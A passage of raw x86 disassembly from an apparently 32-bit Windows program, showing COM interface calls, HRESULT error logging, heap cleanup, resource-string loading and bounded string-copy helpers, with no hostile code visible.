  404b87:	mov    ecx,DWORD PTR [eax]
  404b89:	mov    esi,DWORD PTR [ecx+0x24]
  404b8c:	mov    ecx,esi
  404b8e:	call   DWORD PTR ds:0x40a1c4
  404b94:	call   esi
  404b96:	mov    edi,eax
  404b98:	test   edi,edi
  404b9a:	jns    0x404ba9
  404b9c:	push   edi
  404b9d:	push   0x40206c
  404ba2:	push   0x26e
  404ba7:	jmp    0x404c26
  404ba9:	mov    ecx,DWORD PTR [ebp-0x18]
  404bac:	test   ecx,ecx
  404bae:	je     0x404bc4
  404bb0:	and    DWORD PTR [ebp-0x18],0x0
  404bb4:	mov    eax,DWORD PTR [ecx]
  404bb6:	push   ecx
  404bb7:	mov    esi,DWORD PTR [eax+0x8]
  404bba:	mov    ecx,esi
  404bbc:	call   DWORD PTR ds:0x40a1c4
  404bc2:	call   esi
  404bc4:	mov    eax,DWORD PTR [ebp-0x14]
  404bc7:	lea    ecx,[ebp-0x18]
  404bca:	push   ecx
  404bcb:	push   0x401474
  404bd0:	push   eax
  404bd1:	mov    esi,DWORD PTR [eax]
  404bd3:	mov    ecx,DWORD PTR [esi]
  404bd5:	call   DWORD PTR ds:0x40a1c4
  404bdb:	call   DWORD PTR [esi]
  404bdd:	mov    edi,eax
  404bdf:	test   edi,edi
  404be1:	jns    0x404bf0
  404be3:	push   edi
  404be4:	push   0x40209c
  404be9:	push   0x274
  404bee:	jmp    0x404c26
  404bf0:	mov    esi,DWORD PTR [ebp-0x1c]
  404bf3:	lea    eax,[ebp-0x24]
  404bf6:	mov    edi,DWORD PTR [ebp-0x18]
  404bf9:	lea    ecx,[ebp-0x20]
  404bfc:	mov    DWORD PTR [ebp-0x20],eax
  404bff:	mov    ebx,DWORD PTR [esi]
  404c01:	call   0x405247
  404c06:	mov    ecx,DWORD PTR [ebx+0x24]
  404c09:	push   eax
  404c0a:	push   edi
  404c0b:	push   esi
  404c0c:	call   DWORD PTR ds:0x40a1c4
  404c12:	call   DWORD PTR [ebx+0x24]
  404c15:	mov    edi,eax
  404c17:	test   edi,edi
  404c19:	jns    0x404c35
  404c1b:	push   edi
  404c1c:	push   0x4020c8
  404c21:	push   0x27a
  404c26:	push   0x402038
  404c2b:	push   0x1
  404c2d:	call   0x4052c4
  404c32:	add    esp,0x14
  404c35:	lea    ecx,[ebp-0x24]
  404c38:	call   0x405209
  404c3d:	lea    ecx,[ebp-0x18]
  404c40:	call   0x405209
  404c45:	mov    BYTE PTR [ebp-0x4],0x0
  404c49:	mov    ecx,DWORD PTR [ebp-0x14]
  404c4c:	test   ecx,ecx
  404c4e:	je     0x404c64
  404c50:	and    DWORD PTR [ebp-0x14],0x0
  404c54:	mov    eax,DWORD PTR [ecx]
  404c56:	push   ecx
  404c57:	mov    esi,DWORD PTR [eax+0x8]
  404c5a:	mov    ecx,esi
  404c5c:	call   DWORD PTR ds:0x40a1c4
  404c62:	call   esi
  404c64:	or     DWORD PTR [ebp-0x4],0xffffffff
  404c68:	mov    ecx,DWORD PTR [ebp-0x1c]
  404c6b:	test   ecx,ecx
  404c6d:	je     0x404c83
  404c6f:	and    DWORD PTR [ebp-0x1c],0x0
  404c73:	mov    eax,DWORD PTR [ecx]
  404c75:	push   ecx
  404c76:	mov    esi,DWORD PTR [eax+0x8]
  404c79:	mov    ecx,esi
  404c7b:	call   DWORD PTR ds:0x40a1c4
  404c81:	call   esi
  404c83:	mov    eax,edi
  404c85:	call   0x407a54
  404c8a:	ret    0x8
  404c8d:	int3   
  404c8e:	int3   
  404c8f:	int3   
  404c90:	int3   
  404c91:	int3   
  404c92:	push   0x28
  404c94:	mov    eax,0x407c1e
  404c99:	call   0x407a68
  404c9e:	mov    ebx,edx
  404ca0:	mov    edi,ecx
  404ca2:	xor    eax,eax
  404ca4:	mov    DWORD PTR [ebp-0x30],eax
  404ca7:	mov    DWORD PTR [ebp-0x4],eax
  404caa:	mov    DWORD PTR [ebp-0x2c],eax
  404cad:	mov    DWORD PTR [ebp-0x34],eax
  404cb0:	lea    eax,[ebp-0x28]
  404cb3:	push   eax
  404cb4:	lea    eax,[ebp-0x24]
  404cb7:	push   eax
  404cb8:	push   0x1a
  404cba:	push   0x4020f8
  404cbf:	call   DWORD PTR ds:0x40a0cc
  404cc5:	test   eax,eax
  404cc7:	jns    0x404cda
  404cc9:	push   0x0
  404ccb:	push   0x0
  404ccd:	push   0x1
  404ccf:	push   0xc000000d
  404cd4:	call   DWORD PTR ds:0x40a038
  404cda:	mov    BYTE PTR [ebp-0x4],0x3
  404cde:	mov    ecx,DWORD PTR [ebp-0x30]
  404ce1:	test   ecx,ecx
  404ce3:	je     0x404cf9
  404ce5:	and    DWORD PTR [ebp-0x30],0x0
  404ce9:	mov    eax,DWORD PTR [ecx]
  404ceb:	push   ecx
  404cec:	mov    esi,DWORD PTR [eax+0x8]
  404cef:	mov    ecx,esi
  404cf1:	call   DWORD PTR ds:0x40a1c4
  404cf7:	call   esi
  404cf9:	mov    esi,DWORD PTR [edi]
  404cfb:	lea    eax,[ebp-0x30]
  404cfe:	push   eax
  404cff:	push   DWORD PTR [ebp-0x28]
  404d02:	mov    ecx,DWORD PTR [esi+0x1c]
  404d05:	push   edi
  404d06:	call   DWORD PTR ds:0x40a1c4
  404d0c:	call   DWORD PTR [esi+0x1c]
  404d0f:	mov    BYTE PTR [ebp-0x4],0x2
  404d13:	mov    edi,eax
  404d15:	push   DWORD PTR [ebp-0x28]
  404d18:	call   DWORD PTR ds:0x40a0c8
  404d1e:	test   edi,edi
  404d20:	jns    0x404d32
  404d22:	push   edi
  404d23:	push   0x402130
  404d28:	push   0x29c
  404d2d:	jmp    0x404e12
  404d32:	lea    eax,[ebp-0x28]
  404d35:	push   eax
  404d36:	lea    eax,[ebp-0x24]
  404d39:	push   eax
  404d3a:	push   0x2a
  404d3c:	push   0x401488
  404d41:	call   DWORD PTR ds:0x40a0cc
  404d47:	test   eax,eax
  404d49:	jns    0x404d5c
  404d4b:	push   0x0
  404d4d:	push   0x0
  404d4f:	push   0x1
  404d51:	push   0xc000000d
  404d56:	call   DWORD PTR ds:0x40a038
  404d5c:	mov    ecx,DWORD PTR [ebp-0x2c]
  404d5f:	mov    edi,DWORD PTR [ebp-0x28]
  404d62:	test   ecx,ecx
  404d64:	je     0x404d7a
  404d66:	and    DWORD PTR [ebp-0x2c],0x0
  404d6a:	mov    eax,DWORD PTR [ecx]
  404d6c:	push   ecx
  404d6d:	mov    esi,DWORD PTR [eax+0x8]
  404d70:	mov    ecx,esi
  404d72:	call   DWORD PTR ds:0x40a1c4
  404d78:	call   esi
  404d7a:	lea    eax,[ebp-0x2c]
  404d7d:	push   eax
  404d7e:	push   0x4014f0
  404d83:	push   edi
  404d84:	call   DWORD PTR ds:0x40a0bc
  404d8a:	push   DWORD PTR [ebp-0x28]
  404d8d:	mov    edi,eax
  404d8f:	call   DWORD PTR ds:0x40a0c8
  404d95:	test   edi,edi
  404d97:	jns    0x404da6
  404d99:	push   edi
  404d9a:	push   0x402170
  404d9f:	push   0x2a2
  404da4:	jmp    0x404e12
  404da6:	mov    ecx,DWORD PTR [ebp-0x34]
  404da9:	mov    edi,DWORD PTR [ebp-0x2c]
  404dac:	test   ecx,ecx
  404dae:	je     0x404dc4
  404db0:	and    DWORD PTR [ebp-0x34],0x0
  404db4:	mov    eax,DWORD PTR [ecx]
  404db6:	push   ecx
  404db7:	mov    esi,DWORD PTR [eax+0x8]
  404dba:	mov    ecx,esi
  404dbc:	call   DWORD PTR ds:0x40a1c4
  404dc2:	call   esi
  404dc4:	mov    esi,DWORD PTR [edi]
  404dc6:	lea    eax,[ebp-0x34]
  404dc9:	push   eax
  404dca:	push   ebx
  404dcb:	push   edi
  404dcc:	mov    ecx,DWORD PTR [esi+0x18]
  404dcf:	call   DWORD PTR ds:0x40a1c4
  404dd5:	call   DWORD PTR [esi+0x18]
  404dd8:	mov    edi,eax
  404dda:	test   edi,edi
  404ddc:	jns    0x404deb
  404dde:	push   edi
  404ddf:	push   0x4021a0
  404de4:	push   0x2a8
  404de9:	jmp    0x404e12
  404deb:	mov    eax,DWORD PTR [ebp-0x30]
  404dee:	push   DWORD PTR [ebp-0x34]
  404df1:	push   eax
  404df2:	mov    ecx,DWORD PTR [eax]
  404df4:	mov    esi,DWORD PTR [ecx+0x18]
  404df7:	mov    ecx,esi
  404df9:	call   DWORD PTR ds:0x40a1c4
  404dff:	call   esi
  404e01:	mov    edi,eax
  404e03:	test   edi,edi
  404e05:	jns    0x404e21
  404e07:	push   edi
  404e08:	push   0x4021bc
  404e0d:	push   0x2ae
  404e12:	push   0x402158
  404e17:	push   0x1
  404e19:	call   0x4052c4
  404e1e:	add    esp,0x14
  404e21:	mov    BYTE PTR [ebp-0x4],0x1
  404e25:	mov    ecx,DWORD PTR [ebp-0x34]
  404e28:	test   ecx,ecx
  404e2a:	je     0x404e40
  404e2c:	and    DWORD PTR [ebp-0x34],0x0
  404e30:	mov    eax,DWORD PTR [ecx]
  404e32:	push   ecx
  404e33:	mov    esi,DWORD PTR [eax+0x8]
  404e36:	mov    ecx,esi
  404e38:	call   DWORD PTR ds:0x40a1c4
  404e3e:	call   esi
  404e40:	mov    BYTE PTR [ebp-0x4],0x0
  404e44:	mov    ecx,DWORD PTR [ebp-0x2c]
  404e47:	test   ecx,ecx
  404e49:	je     0x404e5f
  404e4b:	and    DWORD PTR [ebp-0x2c],0x0
  404e4f:	mov    eax,DWORD PTR [ecx]
  404e51:	push   ecx
  404e52:	mov    esi,DWORD PTR [eax+0x8]
  404e55:	mov    ecx,esi
  404e57:	call   DWORD PTR ds:0x40a1c4
  404e5d:	call   esi
  404e5f:	or     DWORD PTR [ebp-0x4],0xffffffff
  404e63:	mov    ecx,DWORD PTR [ebp-0x30]
  404e66:	test   ecx,ecx
  404e68:	je     0x404e7e
  404e6a:	and    DWORD PTR [ebp-0x30],0x0
  404e6e:	mov    eax,DWORD PTR [ecx]
  404e70:	push   ecx
  404e71:	mov    esi,DWORD PTR [eax+0x8]
  404e74:	mov    ecx,esi
  404e76:	call   DWORD PTR ds:0x40a1c4
  404e7c:	call   esi
  404e7e:	mov    eax,edi
  404e80:	call   0x407a54
  404e85:	ret    0x4
  404e88:	int3   
  404e89:	int3   
  404e8a:	int3   
  404e8b:	int3   
  404e8c:	int3   
  404e8d:	push   0x14
  404e8f:	mov    eax,0x407c60
  404e94:	call   0x407a68
  404e99:	mov    ebx,edx
  404e9b:	xor    eax,eax
  404e9d:	mov    DWORD PTR [ebp-0x18],eax
  404ea0:	mov    DWORD PTR [ebp-0x4],eax
  404ea3:	mov    DWORD PTR [ebp-0x14],eax
  404ea6:	mov    DWORD PTR [ebp-0x1c],eax
  404ea9:	mov    eax,DWORD PTR [ebp+0x8]
  404eac:	lea    edx,[ebp-0x18]
  404eaf:	mov    BYTE PTR [ebp-0x4],0x2
  404eb3:	push   edx
  404eb4:	push   ecx
  404eb5:	mov    esi,DWORD PTR [eax]
  404eb7:	push   eax
  404eb8:	mov    ecx,DWORD PTR [esi+0x2c]
  404ebb:	call   DWORD PTR ds:0x40a1c4
  404ec1:	call   DWORD PTR [esi+0x2c]
  404ec4:	mov    edi,eax
  404ec6:	test   edi,edi
  404ec8:	jns    0x404ed7
  404eca:	push   edi
  404ecb:	push   0x4021d8
  404ed0:	push   0x2e8
  404ed5:	jmp    0x404f51
  404ed7:	mov    ecx,DWORD PTR [ebp-0x14]
  404eda:	test   ecx,ecx
  404edc:	je     0x404ef2
  404ede:	and    DWORD PTR [ebp-0x14],0x0
  404ee2:	mov    eax,DWORD PTR [ecx]
  404ee4:	push   ecx
  404ee5:	mov    esi,DWORD PTR [eax+0x8]
  404ee8:	mov    ecx,esi
  404eea:	call   DWORD PTR ds:0x40a1c4
  404ef0:	call   esi
  404ef2:	mov    eax,DWORD PTR [ebp-0x18]
  404ef5:	lea    ecx,[ebp-0x14]
  404ef8:	push   ecx
  404ef9:	push   0x401474
  404efe:	push   eax
  404eff:	mov    esi,DWORD PTR [eax]
  404f01:	mov    ecx,DWORD PTR [esi]
  404f03:	call   DWORD PTR ds:0x40a1c4
  404f09:	call   DWORD PTR [esi]
  404f0b:	mov    edi,eax
  404f0d:	test   edi,edi
  404f0f:	jns    0x404f1e
  404f11:	push   edi
  404f12:	push   0x402208
  404f17:	push   0x2ee
  404f1c:	jmp    0x404f51
  404f1e:	mov    esi,DWORD PTR [ebp-0x14]
  404f21:	lea    eax,[ebp-0x1c]
  404f24:	mov    edi,DWORD PTR [ebx]
  404f26:	lea    ecx,[ebp-0x20]
  404f29:	mov    DWORD PTR [ebp-0x20],eax
  404f2c:	call   0x405247
  404f31:	mov    ecx,DWORD PTR [edi+0x58]
  404f34:	push   eax
  404f35:	push   esi
  404f36:	push   ebx
  404f37:	call   DWORD PTR ds:0x40a1c4
  404f3d:	call   DWORD PTR [edi+0x58]
  404f40:	mov    edi,eax
  404f42:	test   edi,edi
  404f44:	jns    0x404f60
  404f46:	push   edi
  404f47:	push   0x402234
  404f4c:	push   0x2f4
  404f51:	push   0x4021f4
  404f56:	push   0x1
  404f58:	call   0x4052c4
  404f5d:	add    esp,0x14
  404f60:	lea    ecx,[ebp-0x1c]
  404f63:	call   0x405209
  404f68:	lea    ecx,[ebp-0x14]
  404f6b:	call   0x405209
  404f70:	or     DWORD PTR [ebp-0x4],0xffffffff
  404f74:	mov    ecx,DWORD PTR [ebp-0x18]
  404f77:	test   ecx,ecx
  404f79:	je     0x404f8f
  404f7b:	and    DWORD PTR [ebp-0x18],0x0
  404f7f:	mov    eax,DWORD PTR [ecx]
  404f81:	push   ecx
  404f82:	mov    esi,DWORD PTR [eax+0x8]
  404f85:	mov    ecx,esi
  404f87:	call   DWORD PTR ds:0x40a1c4
  404f8d:	call   esi
  404f8f:	mov    eax,edi
  404f91:	call   0x407a54
  404f96:	ret    0x4
  404f99:	int3   
  404f9a:	int3   
  404f9b:	int3   
  404f9c:	int3   
  404f9d:	int3   
  404f9e:	mov    edi,edi
  404fa0:	push   ebp
  404fa1:	mov    ebp,esp
  404fa3:	push   ecx
  404fa4:	mov    ax,WORD PTR [ebp+0x8]
  404fa8:	push   ebx
  404fa9:	push   esi
  404faa:	push   edi
  404fab:	mov    esi,edx
  404fad:	xor    ebx,ebx
  404faf:	mov    edx,ecx
  404fb1:	xor    edi,edi
  404fb3:	mov    DWORD PTR [ebp-0x4],edx
  404fb6:	test   ax,ax
  404fb9:	je     0x40508f
  404fbf:	mov    cx,WORD PTR [ebp+0xc]
  404fc3:	test   cx,cx
  404fc6:	je     0x40508f
  404fcc:	cmp    DWORD PTR [ebp+0x10],ebx
  404fcf:	je     0x40508f
  404fd5:	cmp    DWORD PTR [ebp+0x14],ebx
  404fd8:	je     0x40508f
  404fde:	test   edx,edx
  404fe0:	je     0x40508f
  404fe6:	movzx  edi,ax
  404fe9:	push   edi
  404fea:	push   esi
  404feb:	call   0x405198
  404ff0:	mov    ebx,eax
  404ff2:	pop    ecx
  404ff3:	pop    ecx
  404ff4:	test   ebx,ebx
  404ff6:	jne    0x40501c
  404ff8:	push   edi
  404ff9:	push   0x402260
  404ffe:	push   0x31b
  405003:	push   0x4022a8
  405008:	push   0x1
  40500a:	mov    esi,0x80004005
  40500f:	call   0x4052c4
  405014:	add    esp,0x14
  405017:	jmp    0x4050c1
  40501c:	mov    ecx,DWORD PTR [ebp-0x4]
  40501f:	movzx  eax,WORD PTR [ebp+0xc]
  405023:	push   DWORD PTR [ecx+0x328]
  405029:	push   eax
  40502a:	push   esi
  40502b:	call   0x405198
  405030:	mov    edi,eax
  405032:	add    esp,0xc
  405035:	test   edi,edi
  405037:	jne    0x40504a
  405039:	movzx  eax,WORD PTR [ebp+0xc]
  40503d:	push   eax
  40503e:	push   0x4022d0
  405043:	push   0x324
  405048:	jmp    0x405066
  40504a:	push   0x67
  40504c:	push   esi
  40504d:	call   0x405198
  405052:	pop    ecx
  405053:	pop    ecx
  405054:	mov    ecx,eax
  405056:	test   ecx,ecx
  405058:	jne    0x40507c
  40505a:	push   0x67
  40505c:	push   0x402318
  405061:	push   0x32b
  405066:	push   0x4022a8
  40506b:	push   0x1
  40506d:	mov    esi,0x80004005
  405072:	call   0x4052c4
  405077:	add    esp,0x14
  40507a:	jmp    0x405094
  40507c:	mov    eax,DWORD PTR [ebp+0x10]
  40507f:	xor    esi,esi
  405081:	mov    DWORD PTR [eax],ebx
  405083:	mov    eax,DWORD PTR [ebp+0x14]
  405086:	mov    DWORD PTR [eax],edi
  405088:	mov    eax,DWORD PTR [ebp+0x18]
  40508b:	mov    DWORD PTR [eax],ecx
  40508d:	jmp    0x4050c1
  40508f:	mov    esi,0x80070057
  405094:	test   ebx,ebx
  405096:	je     0x4050aa
  405098:	mov    eax,fs:0x30
  40509e:	push   ebx
  40509f:	push   0x0
  4050a1:	push   DWORD PTR [eax+0x18]
  4050a4:	call   DWORD PTR ds:0x40a170
  4050aa:	test   edi,edi
  4050ac:	je     0x4050c1
  4050ae:	mov    ecx,DWORD PTR fs:0x30
  4050b5:	push   edi
  4050b6:	push   0x0
  4050b8:	push   DWORD PTR [ecx+0x18]
  4050bb:	call   DWORD PTR ds:0x40a170
  4050c1:	pop    edi
  4050c2:	mov    eax,esi
  4050c4:	pop    esi
  4050c5:	pop    ebx
  4050c6:	mov    esp,ebp
  4050c8:	pop    ebp
  4050c9:	ret    0x14
  4050cc:	int3   
  4050cd:	int3   
  4050ce:	int3   
  4050cf:	int3   
  4050d0:	int3   
  4050d1:	mov    edi,edi
  4050d3:	push   ebp
  4050d4:	mov    ebp,esp
  4050d6:	sub    esp,0x604
  4050dc:	mov    eax,ds:0x409004
  4050e1:	xor    eax,ebp
  4050e3:	mov    DWORD PTR [ebp-0x4],eax
  4050e6:	push   ebx
  4050e7:	push   esi
  4050e8:	push   edi
  4050e9:	xor    eax,eax
  4050eb:	xor    esi,esi
  4050ed:	push   0x5fe
  4050f2:	mov    WORD PTR [ebp-0x604],ax
  4050f9:	mov    edi,edx
  4050fb:	lea    eax,[ebp-0x602]
  405101:	mov    ebx,ecx
  405103:	push   esi
  405104:	push   eax
  405105:	call   0x407abc
  40510a:	add    esp,0xc
  40510d:	test   edi,0xffff0000
  405113:	je     0x405119
  405115:	mov    eax,edi
  405117:	jmp    0x405182
  405119:	test   di,di
  40511c:	je     0x405180
  40511e:	push   0x300
  405123:	lea    eax,[ebp-0x604]
  405129:	push   eax
  40512a:	movzx  eax,di
  40512d:	push   eax
  40512e:	push   ebx
  40512f:	call   DWORD PTR ds:0x40b010
  405135:	test   eax,eax
  405137:	je     0x405180
  405139:	lea    ecx,[ebp-0x604]
  40513f:	lea    edx,[ecx+0x2]
  405142:	mov    ax,WORD PTR [ecx]
  405145:	add    ecx,0x2
  405148:	cmp    ax,si
  40514b:	jne    0x405142
  40514d:	mov    eax,fs:0x30
  405153:	sub    ecx,edx
  405155:	sar    ecx,1
  405157:	lea    edi,[ecx*2+0x2]
  40515e:	push   edi
  40515f:	push   0x8
  405161:	push   DWORD PTR [eax+0x18]
  405164:	call   DWORD PTR ds:0x40a1b8
  40516a:	mov    esi,eax
  40516c:	test   esi,esi
  40516e:	je     0x405180
  405170:	lea    eax,[ebp-0x604]
  405176:	mov    edx,edi
  405178:	push   eax
  405179:	mov    ecx,esi
  40517b:	call   0x4034ff
  405180:	mov    eax,esi
  405182:	mov    ecx,DWORD PTR [ebp-0x4]
  405185:	pop    edi
  405186:	pop    esi
  405187:	xor    ecx,ebp
  405189:	pop    ebx
  40518a:	call   0x407330
  40518f:	mov    esp,ebp
  405191:	pop    ebp
  405192:	ret    
  405193:	int3   
  405194:	int3   
  405195:	int3   
  405196:	int3   
  405197:	int3   
  405198:	mov    edi,edi
  40519a:	push   ebp
  40519b:	mov    ebp,esp
  40519d:	push   ecx
  40519e:	push   ecx
  40519f:	mov    ecx,DWORD PTR [ebp+0x8]
  4051a2:	lea    eax,[ebp+0x10]
  4051a5:	push   ebx
  4051a6:	mov    ebx,DWORD PTR [ebp+0xc]
  4051a9:	mov    edx,ebx
  4051ab:	push   esi
  4051ac:	xor    esi,esi
  4051ae:	mov    DWORD PTR [ebp-0x8],eax
  4051b1:	push   edi
  4051b2:	mov    DWORD PTR [ebp-0x4],esi
  4051b5:	call   0x4050d1
  4051ba:	mov    edi,eax
  4051bc:	test   edi,edi
  4051be:	je     0x4051fb
  4051c0:	lea    eax,[ebp-0x8]
  4051c3:	push   eax
  4051c4:	push   esi
  4051c5:	lea    eax,[ebp-0x4]
  4051c8:	push   eax
  4051c9:	push   esi
  4051ca:	push   esi
  4051cb:	push   edi
  4051cc:	push   0x500
  4051d1:	call   DWORD PTR ds:0x40a034
  4051d7:	neg    eax
  4051d9:	sbb    eax,eax
  4051db:	and    eax,DWORD PTR [ebp-0x4]
  4051de:	mov    DWORD PTR [ebp-0x4],eax
  4051e1:	cmp    edi,ebx
  4051e3:	je     0x4051f9
  4051e5:	mov    eax,fs:0x30
  4051eb:	push   edi
  4051ec:	push   esi
  4051ed:	push   DWORD PTR [eax+0x18]
  4051f0:	call   DWORD PTR ds:0x40a170
  4051f6:	mov    eax,DWORD PTR [ebp-0x4]
  4051f9:	mov    esi,eax
  4051fb:	pop    edi
  4051fc:	mov    eax,esi
  4051fe:	pop    esi
  4051ff:	pop    ebx
  405200:	mov    esp,ebp
  405202:	pop    ebp
  405203:	ret    
  405204:	int3   
  405205:	int3   
  405206:	int3   
  405207:	int3   
  405208:	int3   
  405209:	mov    edi,edi
  40520b:	push   ebp
  40520c:	mov    ebp,esp
  40520e:	push   ecx
  40520f:	mov    eax,ds:0x409004
  405214:	xor    eax,ebp
  405216:	mov    DWORD PTR [ebp-0x4],eax
  405219:	mov    edx,DWORD PTR [ecx]
  40521b:	test   edx,edx
  40521d:	je     0x405234
  40521f:	and    DWORD PTR [ecx],0x0
  405222:	mov    eax,DWORD PTR [edx]
  405224:	push   esi
  405225:	push   edx
  405226:	mov    esi,DWORD PTR [eax+0x8]
  405229:	mov    ecx,esi
  40522b:	call   DWORD PTR ds:0x40a1c4
  405231:	call   esi
  405233:	pop    esi
  405234:	mov    ecx,DWORD PTR [ebp-0x4]
  405237:	xor    ecx,ebp
  405239:	call   0x407330
  40523e:	mov    esp,ebp
  405240:	pop    ebp
  405241:	ret    
  405242:	int3   
  405243:	int3   
  405244:	int3   
  405245:	int3   
  405246:	int3   
  405247:	mov    edi,edi
  405249:	push   ebp
  40524a:	mov    ebp,esp
  40524c:	push   ecx
  40524d:	mov    eax,ds:0x409004
  405252:	xor    eax,ebp
  405254:	mov    DWORD PTR [ebp-0x4],eax
  405257:	push   edi
  405258:	mov    edi,DWORD PTR [ecx]
  40525a:	mov    eax,DWORD PTR [edi]
  40525c:	test   eax,eax
  40525e:	je     0x405275
  405260:	and    DWORD PTR [edi],0x0
  405263:	mov    ecx,DWORD PTR [eax]
  405265:	push   esi
  405266:	push   eax
  405267:	mov    esi,DWORD PTR [ecx+0x8]
  40526a:	mov    ecx,esi
  40526c:	call   DWORD PTR ds:0x40a1c4
  405272:	call   esi
  405274:	pop    esi
  405275:	mov    ecx,DWORD PTR [ebp-0x4]
  405278:	mov    eax,edi
  40527a:	xor    ecx,ebp
  40527c:	pop    edi
  40527d:	call   0x407330
  405282:	mov    esp,ebp
  405284:	pop    ebp
  405285:	ret    
  405286:	int3   
  405287:	int3   
  405288:	int3   
  405289:	int3   
  40528a:	int3   
  40528b:	mov    edi,edi
  40528d:	push   ebp
  40528e:	mov    ebp,esp
  405290:	push   esi
  405291:	mov    esi,ecx
  405293:	push   esi
  405294:	lea    eax,[esi+0x4]
  405297:	push   eax
  405298:	push   0x8
  40529a:	push   DWORD PTR [ebp+0x8]
  40529d:	call   DWORD PTR ds:0x40a0cc
  4052a3:	test   eax,eax
  4052a5:	jns    0x4052b8
  4052a7:	push   0x0
  4052a9:	push   0x0
  4052ab:	push   0x1
  4052ad:	push   0xc000000d
  4052b2:	call   DWORD PTR ds:0x40a038
  4052b8:	mov    eax,esi
  4052ba:	pop    esi
  4052bb:	pop    ebp
  4052bc:	ret    0x4
  4052bf:	int3   
  4052c0:	int3   
  4052c1:	int3   
  4052c2:	int3   
  4052c3:	int3   
  4052c4:	mov    edi,edi
  4052c6:	push   ebp
  4052c7:	mov    ebp,esp
  4052c9:	push   ecx
  4052ca:	mov    eax,ds:0x409004
  4052cf:	xor    eax,ebp
  4052d1:	mov    DWORD PTR [ebp-0x4],eax
  4052d4:	push   esi
  4052d5:	mov    esi,DWORD PTR ds:0x4093d0
  4052db:	test   esi,esi
  4052dd:	je     0x4052f9
  4052df:	lea    eax,[ebp+0x18]
  4052e2:	mov    ecx,esi
  4052e4:	push   eax
  4052e5:	push   DWORD PTR [ebp+0x14]
  4052e8:	push   DWORD PTR [ebp+0x10]
  4052eb:	push   DWORD PTR [ebp+0xc]
  4052ee:	push   DWORD PTR [ebp+0x8]
  4052f1:	call   DWORD PTR ds:0x40a1c4
  4052f7:	call   esi
  4052f9:	mov    ecx,DWORD PTR [ebp-0x4]
  4052fc:	xor    ecx,ebp
  4052fe:	pop    esi
  4052ff:	call   0x407330
  405304:	mov    esp,ebp
  405306:	pop    ebp
  405307:	ret    
  405308:	int3   
  405309:	int3   
  40530a:	int3   
  40530b:	int3   
  40530c:	int3   
  40530d:	mov    edi,edi
  40530f:	push   ebp
  405310:	mov    ebp,esp
  405312:	xor    eax,eax
  405314:	test   edx,edx
  405316:	je     0x405320
  405318:	cmp    edx,0x7fffffff
  40531e:	jbe    0x405325
  405320:	mov    eax,0xc000000d
  405325:	test   eax,eax
  405327:	js     0x405335
  405329:	push   ecx
  40532a:	push   DWORD PTR [ebp+0x8]
  40532d:	push   ecx
  40532e:	call   0x405432
  405333:	jmp    0x40533c
  405335:	test   edx,edx
  405337:	je     0x40533c
  405339:	mov    BYTE PTR [ecx],0x0
  40533c:	pop    ebp
  40533d:	ret    0x4
  405340:	int3   
  405341:	int3   
  405342:	int3   
  405343:	int3   
  405344:	int3   
  405345:	mov    edi,edi
  405347:	push   ebp
  405348:	mov    ebp,esp
  40534a:	xor    eax,eax
  40534c:	test   edx,edx
  40534e:	je     0x405358
  405350:	cmp    edx,0x7fffffff
  405356:	jbe    0x40535d
  405358:	mov    eax,0xc000000d
  40535d:	test   eax,eax
  40535f:	js     0x40536f
  405361:	push   DWORD PTR [ebp+0xc]
  405364:	push   DWORD PTR [ebp+0x8]
  405367:	push   ecx
  405368:	call   0x405479
  40536d:	jmp    0x405376
  40536f:	test   edx,edx
  405371:	je     0x405376
  405373:	mov    BYTE PTR [ecx],0x0
  405376:	pop    ebp
  405377:	ret    0x8
  40537a:	int3   
  40537b:	int3   
  40537c:	int3   
  40537d:	int3   
  40537e:	int3   
  40537f:	mov    edi,edi
  405381:	push   ebp
  405382:	mov    ebp,esp
  405384:	mov    eax,DWORD PTR [ebp+0xc]
  405387:	xor    ecx,ecx
  405389:	test   eax,eax
  40538b:	je     0x405394
  40538d:	cmp    eax,0x7fffffff
  405392:	jbe    0x405399
  405394:	mov    ecx,0xc000000d
  405399:	test   ecx,ecx
  40539b:	js     0x4053b3
  40539d:	lea    ecx,[ebp+0x14]
  4053a0:	mov    edx,eax
  4053a2:	push   ecx
  4053a3:	push   DWORD PTR [ebp+0x10]
  4053a6:	push   ecx
  4053a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4053aa:	call   0x405479
  4053af:	mov    ecx,eax
  4053b1:	jmp    0x4053bd
  4053b3:	test   eax,eax
  4053b5:	je     0x4053bd
  4053b7:	mov    eax,DWORD PTR [ebp+0x8]
  4053ba:	mov    BYTE PTR [eax],0x0
  4053bd:	mov    eax,ecx
  4053bf:	pop    ebp
  4053c0:	ret    
  4053c1:	int3   
  4053c2:	int3   
  4053c3:	int3   
  4053c4:	int3   
  4053c5:	int3   
  4053c6:	mov    edi,edi
  4053c8:	push   ebp
  4053c9:	mov    ebp,esp
  4053cb:	mov    eax,DWORD PTR [ebp+0xc]
  4053ce:	push   esi
  4053cf:	xor    esi,esi
  4053d1:	test   eax,eax
  4053d3:	je     0x4053dc
  4053d5:	cmp    eax,0x7fffffff
  4053da:	jbe    0x4053e1
  4053dc:	mov    esi,0xc000000d
  4053e1:	test   esi,esi
  4053e3:	js     0x40541c
  4053e5:	push   ebx
  4053e6:	mov    ebx,DWORD PTR [ebp+0x8]
  4053e9:	xor    esi,esi
  4053eb:	push   edi
  4053ec:	lea    edi,[eax-0x1]
  4053ef:	lea    eax,[ebp+0x14]
  4053f2:	push   eax
  4053f3:	push   DWORD PTR [ebp+0x10]
  4053f6:	push   edi
  4053f7:	push   ebx
  4053f8:	call   DWORD PTR ds:0x40a140
  4053fe:	add    esp,0x10
  405401:	test   eax,eax
  405403:	js     0x40540d
  405405:	cmp    eax,edi
  405407:	ja     0x40540d
  405409:	jne    0x405418
  40540b:	jmp    0x405412
  40540d:	mov    esi,0x80000005
  405412:	xor    eax,eax
  405414:	mov    WORD PTR [ebx+edi*2],ax
  405418:	pop    edi
  405419:	pop    ebx
  40541a:	jmp    0x405428
  40541c:	test   eax,eax
  40541e:	je     0x405428
  405420:	mov    ecx,DWORD PTR [ebp+0x8]
  405423:	xor    eax,eax
  405425:	mov    WORD PTR [ecx],ax
  405428:	mov    eax,esi
  40542a:	pop    esi
  40542b:	pop    ebp
  40542c:	ret    
  40542d:	int3   
  40542e:	int3   
  40542f:	int3   
  405430:	int3   
  405431:	int3   
  405432:	mov    edi,edi
  405434:	push   ebp
  405435:	mov    ebp,esp
  405437:	push   edi
  405438:	xor    edi,edi
  40543a:	test   edx,edx
  40543c:	je     0x405464
  40543e:	mov    eax,DWORD PTR [ebp+0xc]
  405441:	push   ebx
  405442:	push   esi
